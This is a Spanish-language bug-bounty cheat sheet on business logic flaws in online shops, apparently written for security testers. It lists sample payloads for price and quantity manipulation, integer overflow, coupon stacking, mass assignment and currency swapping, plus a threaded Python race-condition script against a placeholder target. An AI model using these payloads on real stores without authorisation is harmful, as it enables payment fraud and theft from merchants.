---
title: "Business Logic Vulnerabilities"
description: "Las vulnerabilidades de lógica de negocio explotan cómo funciona la aplicación — no bugs técnicos, sino fallos en el diseño del flujo."
category: "Web"
date: 2026-07-18
---
# Business Logic Vulnerabilities

Las vulnerabilidades de lógica de negocio explotan **cómo funciona la aplicación** — no bugs técnicos, sino fallos en el diseño del flujo. Son las más difíciles de automatizar y las más consistentemente recompensadas.

---

## Price Manipulation

### Client-Side Price Trust

El precio se calcula en cliente y se envía en el body:

```json
POST /checkout HTTP/1.1
{"items":[{"sku":"PROD001","qty":1,"price":99.99}],"total":99.99}
```

Probar cambiar `price` a `0.01`, `0`, o `-99.99`.

### Negative Values

```json
{"quantity": -1, "unitPrice": 99.99}
{"price": -99.99}
{"discount": 999}
```

Si `quantity * unitPrice` no valida signo → total negativo → la app te debe dinero.

### Integer Overflow

```json
{"quantity": 2147483648, "unitPrice": 0.01}
```

Si el backend usa `int32` → `2147483648` wraps a `-2147483648` → total negativo.

### Decimal/Fraction Quantity

```json
{"quantity": 0.5, "unitPrice": 100}
{"quantity": 0.0001, "unitPrice": 1000}
```

Si el backend no valida que quantity sea entero positivo → pagas fracción del precio.

### Formula Injection

```json
{"coupon": "50%OFF + FREE_SHIPPING + EXTRA_10"}
```

A veces el backend concatena cupones en una fórmula sin validar.

---

## Coupon Abuse

### Multiple redemptions

```http
POST /cart/coupon
{"code": "WELCOME10", "apply_twice": true}
POST /cart/coupon
{"code": "WELCOME10"}
POST /cart/coupon
{"code": "WELCOME10"}
```

Probar aplicar el mismo cupón múltiples veces con race condition.

### Stacking

Aplicar cupones que no deberían combinarse:

```json
{"coupons": ["50OFF", "30OFF", "FREESHIP", "NEWUSER"]}
```

### Personal coupon reuse

Cupones de un solo uso — ¿se pueden reusar en otra cuenta? ¿en otro carrito?

---

## Race Conditions (TOCTOU)

### Coupon double-redemption

```python
import requests, threading

def apply_coupon():
    requests.post("https://target.com/cart/coupon",
                  json={"code": "WELCOME50"}, cookies=sess)

threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads: t.start()
```

### Account creation race

```python
# Crear misma cuenta dos veces simultáneamente
# ¿Se crean dos cuentas? ¿El saldo se duplica?
```

---

## Workflow bypass

### Saltarse pasos

```
Flujo normal:    Cart → Shipping → Payment → Confirm
Flujo bypass:    Cart → /confirm (saltar shipping y payment)
```

### State machine violations

```
- Devolver producto sin haberlo comprado
- Aplicar descuento post-pago
- Cancelar orden ya enviada
```

### Mass Assignment

```json
POST /profile/update
{"email": "test@test.com", "is_admin": true, "balance": 99999}
```

---

## Currency manipulation

```json
{"currency": "USD", "amount": 100}
→ {"currency": "JPY", "amount": 100}   # Mismo número, moneda diferente
→ {"currency": "VND", "amount": 100}   # 100 VND ≈ $0.004
```

---

## Categorías adicionales

| Categoría | Ejemplo |
|-----------|---------|
| **Gift card** | Canjear misma gift card múltiples veces |
| **Referral** | Auto-referirse, crear cuentas falsas |
| **Subscription** | Degradar plan, cancelar y mantener acceso |
| **Withdrawal** | Retirar más del balance, retiros negativos |
| **Loan** | Pedir préstamo y no pagar |
| **Auction** | Pujar sobre tu propia puja, retirar puja final |

---

## Severidad estimada

| Vulnerabilidad | Severidad | Rango bounty |
|---------------|-----------|-------------|
| Comprar item por $0 | P1 Critical | $1k–$10k+ |
| Pagar fracción del precio | P1–P2 High | $500–$5k |
| Cupón infinito | P2 High | $300–$2k |
| Manipulación de moneda | P2 High | $500–$3k |
| Descuento amplificado | P2–P3 Med | $150–$1k |

---

## Reports públicos

- [Coupon race condition → free orders - Instacart](https://hackerone.com/reports/1795685)
- [Negative quantity → negative total - Upserve](https://hackerone.com/reports/1321091)
- [Integer overflow → negative charge](https://hackerone.com/hacktivity?querystring=integer+overflow+price)
- [CVE-2025-8198: WooCommerce price manipulation (fraction qty)](https://nvd.nist.gov/vuln/detail/cve-2025-8198)

---

## Relacionado
- **Autenticacion Web** — mass assignment en profile/roles
- **Cache Poisoning y Web Cache Deception** — cache de precios
- **IDOR** — business logic IDOR en órdenes
- **Race Conditions** — race en cupones, pagos, transfers
- **SSRF** — business logic SSRF en import/export
- **WebSocket Security** — rate limit bypass via WS
- **Claude-BugHunter** (skill `hunt-business-logic`, `offensive-business-logic`)
